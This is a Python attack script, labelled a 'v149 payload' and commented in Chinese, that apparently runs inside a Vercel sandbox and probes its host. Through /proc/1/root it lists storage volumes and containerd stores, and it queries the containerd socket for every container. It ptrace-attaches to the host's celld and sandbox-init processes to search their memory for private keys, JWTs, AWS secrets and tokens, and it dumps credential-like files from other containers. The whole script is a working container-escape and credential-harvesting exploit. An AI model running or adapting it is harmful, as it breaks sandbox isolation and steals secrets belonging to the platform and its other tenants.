# -*- coding: utf-8 -*-
"""v149 payload: /volumes drive 池 + blockfile 快照 + containerd 全容器 + celld/sandbox-init 内存凭证
输出 /vercel/sandbox/v149c.out"""
import socket, struct, time, json, os, signal, re, ctypes

OUT = '/vercel/sandbox/v149c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'
CELL = '/run/cell/cell.sock'


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def readp(pid, name, n=6000):
    try:
        return open('/proc/%d/%s' % (pid, name), 'rb').read(n)
    except Exception as e:
        return b'EXC %s' % str(e).encode()


def mem_scan(pid, kws, max_regions=10, max_chunk=4 * 1024 * 1024, max_found=15, tag=''):
    """ptrace 附加 + 读 rw/数据段搜关键词"""
    try:
        libc = ctypes.CDLL(None, use_errno=True)
        r = libc.ptrace(16, pid, 0, 0)
        log('%s PTRACE_ATTACH rc=%d errno=%d' % (tag, r, ctypes.get_errno()))
        if r != 0:
            return
        time.sleep(0.3)
        try:
            maps = open('/proc/%d/maps' % pid).read()
        except Exception:
            maps = ''
        regions = []
        for ln in maps.splitlines():
            parts = ln.split()
            if len(parts) < 2:
                continue
            a, b = parts[0].split('-')
            size = int(b, 16) - int(a, 16)
            if size < 4096 or size > 300 * 1024 * 1024:
                continue
            perm = parts[1]
            # rw 堆 + r-x 主二进制段 + r-- 数据段
            if perm[0] != 'r':
                continue
            regions.append((int(a, 16), size, perm))
        regions.sort(key=lambda x: -x[1])
        found = 0
        scanned = 0
        for base, size, perm in regions:
            if scanned >= max_regions or found >= max_found:
                break
            scanned += 1
            try:
                mf = open('/proc/%d/mem' % pid, 'rb')
                mf.seek(base)
                chunk = mf.read(min(size, max_chunk))
                mf.close()
                for kw in kws:
                    if found >= max_found:
                        break
                    for m in re.finditer(re.escape(kw), chunk):
                        s = max(0, m.start() - 80)
                        log('%s MEM %s %s @0x%x: %r' % (tag, pid, kw, base + m.start(), chunk[s:m.end() + 160]))
                        found += 1
                        if found >= max_found:
                            break
            except Exception as e:
                log('%s mem EXC %s' % (tag, e))
        log('%s mem scan done regions=%d found=%d' % (tag, scanned, found))
        libc.ptrace(17, pid, 0, 0)
    except Exception as e:
        log('%s ptrace EXC %s' % (tag, e))


def ls_rec(p, depth=0, max_items=60):
    """递归列目录, 返回条目列表字符串"""
    out = []
    try:
        for name in sorted(os.listdir(p))[:max_items]:
            fp = p + '/' + name
            try:
                st = os.stat(fp)
                if st.st_mode & 0o170000 == 0o040000:
                    out.append('%s/' % fp)
                else:
                    out.append('%s (%d)' % (fp, st.st_size))
            except Exception:
                out.append(fp)
    except Exception as e:
        out.append('%s EXC %s' % (p, e))
    return out


# ============ 1: /volumes drive 池 ============
log('=== 1 /volumes ===')
for p in ['/volumes', R + '/volumes']:
    try:
        names = sorted(os.listdir(p))[:50]
    except Exception as e:
        log('ls %s EXC %s' % (p, e))
        continue
    for name in names:
        fp = p + '/' + name
        try:
            st = os.stat(fp)
            if st.st_mode & 0o170000 == 0o040000:
                sub = sorted(os.listdir(fp))[:40]
                log('%s/ = %s' % (fp, sub))
                for s2 in sub[:10]:
                    fp2 = fp + '/' + s2
                    try:
                        st2 = os.stat(fp2)
                        if st2.st_mode & 0o170000 != 0o040000:
                            log('  %s (%d)' % (fp2, st2.st_size))
                    except Exception:
                        pass
            else:
                log('%s (%d)' % (fp, st.st_size))
        except Exception as e:
            log('%s EXC %s' % (fp, e))

# ============ 2: blockfile snapshotter ============
log('=== 2 blockfile ===')
for base in [R + '/var/lib/containerd/io.containerd.snapshotter.v1.blockfile',
             R + '/var/lib/containerd/io.containerd.sandbox.controller.v1.shim',
             R + '/var/lib/containerd/io.containerd.metadata.v1.bolt']:
    try:
        for name in sorted(os.listdir(base))[:40]:
            fp = base + '/' + name
            try:
                st = os.stat(fp)
                if st.st_mode & 0o170000 == 0o040000:
                    log('DIR %s/ = %s' % (fp, sorted(os.listdir(fp))[:25]))
                else:
                    log('FILE %s (%d)' % (fp, st.st_size))
            except Exception as e:
                log('%s EXC %s' % (fp, e))
    except Exception as e:
        log('ls %s EXC %s' % (base, e))

# metadata bolt db 大小 + 字符串 (可能含 drive_id)
try:
    for name in os.listdir(R + '/var/lib/containerd/io.containerd.metadata.v1.bolt'):
        fp = R + '/var/lib/containerd/io.containerd.metadata.v1.bolt/' + name
        st = os.stat(fp)
        log('bolt %s size=%d' % (name, st.st_size))
        if st.st_size < 30 * 1024 * 1024:
            data = open(fp, 'rb').read(min(st.st_size, 8 * 1024 * 1024))
            for m in re.finditer(rb'hvc_[A-Za-z0-9_]{10,80}', data):
                log('bolt HVC %s' % m.group().decode(errors='replace'))
            for m in re.finditer(rb'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', data):
                log('bolt UUID %s' % m.group().decode(errors='replace'))
except Exception as e:
    log('bolt EXC %s' % e)

# ============ 3: containerd 全容器 ============
log('=== 3 containerd list ===')
try:
    import subprocess
    tmp = '/vercel/sandbox/curl_req.bin'
    open(tmp, 'wb').write(b'')
    hdr = '/vercel/sandbox/curl_hdr.txt'
    csock = R + '/run/containerd/containerd.sock'
    log('containerd.sock exists=%s' % os.path.exists(csock))
    cmd = ['curl', '-sS', '--max-time', '6', '--http2-prior-knowledge',
           '--unix-socket', csock, '-X', 'POST',
           '-H', 'Content-Type: application/grpc', '-H', 'containerd-namespace: default',
           '-D', hdr, '--data-binary', '@%s' % tmp,
           'http://unix/containerd.services.containers.v1.Containers/List']
    r = subprocess.run(cmd, capture_output=True, timeout=8)
    hdrtxt = ''
    try:
        hdrtxt = open(hdr, encoding='utf-8', errors='replace').read().replace('\n', ' ')[:300]
    except Exception:
        pass
    log('CTR List rc=%d HDR:%s' % (r.returncode, hdrtxt))
    out = r.stdout
    # 提取容器 id 和 image
    for m in re.finditer(rb'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', out):
        log('CTR %s' % m.group().decode())
    for m in re.finditer(rb'(?:ctr_|v1[0-9][0-9][a-z])[A-Za-z0-9_]{4,40}', out):
        log('CTRID %s' % m.group().decode())
    for m in re.finditer(rb'(?:sandbox-controller|ecr|sha256:)[A-Za-z0-9:./@_-]{20,120}', out):
        log('IMG %s' % m.group().decode()[:150])
    log('CTR raw len=%d %r' % (len(out), out[:600]))
except Exception as e:
    log('containerd list EXC %s' % e)

# ============ 4: celld 内存扫描 ============
log('=== 4 celld mem ===')
try:
    celld_pid = 1
    log('celld comm=%r' % readp(celld_pid, 'comm', 100))
    mem_scan(celld_pid,
             [b'PRIVATE KEY', b'eyJ', b'AWS_', b'aws_secret', b'Authorization', b'Bearer ',
              b'token', b'signature', b'iSQYQh1a', b'TF4G6bXN'],
             max_regions=12, max_chunk=6 * 1024 * 1024, max_found=18, tag='celld')
except Exception as e:
    log('celld mem EXC %s' % e)

# ============ 5: sandbox-init 内存扫私钥 ============
log('=== 5 init mem ===')
try:
    init_pid = None
    for d in sorted(os.listdir(R + '/run/cell/runc')):
        try:
            init_pid = int(open(R + '/run/cell/runc/%s/container.pid' % d).read().strip())
        except Exception:
            pass
    if init_pid:
        log('init pid=%d' % init_pid)
        mem_scan(init_pid,
                 [b'PRIVATE KEY', b'BEGIN EC', b'BEGIN RSA', b'BEGIN OPENSSH', b'BEGIN ED',
                  b'eyJ', b'init.sock', b'pubkey', b'secret'],
                 max_regions=10, max_chunk=4 * 1024 * 1024, max_found=12, tag='init')
    else:
        log('no init pid')
except Exception as e:
    log('init mem EXC %s' % e)

# ============ 6: sandbox-init rootfs 密钥文件 ============
log('=== 6 init rootfs ===')
try:
    if runc_dir:
        pass
except Exception:
    pass
for base in [R + '/run/cell/runc']:
    try:
        for d in sorted(os.listdir(base)):
            rf = base + '/' + d + '/rootfs'
            for sub in ['', '/etc', '/run', '/var', '/opt', '/root', '/home', '/usr/local']:
                p = rf + sub
                try:
                    entries = sorted(os.listdir(p))[:30]
                    for e in entries:
                        fp = p + '/' + e
                        try:
                            st = os.stat(fp)
                            if st.st_mode & 0o170000 != 0o040000 and st.st_size < 200000:
                                if any(k in e.lower() for k in ['key', 'secret', 'token', 'cred', 'config', 'pem', 'cert', 'auth']):
                                    log('RF %s (%d): %r' % (fp, st.st_size, open(fp, 'rb').read(800)))
                        except Exception:
                            pass
                except Exception:
                    pass
    except Exception as e:
        log('rootfs scan EXC %s' % e)

log('V149_DONE')
f.close()
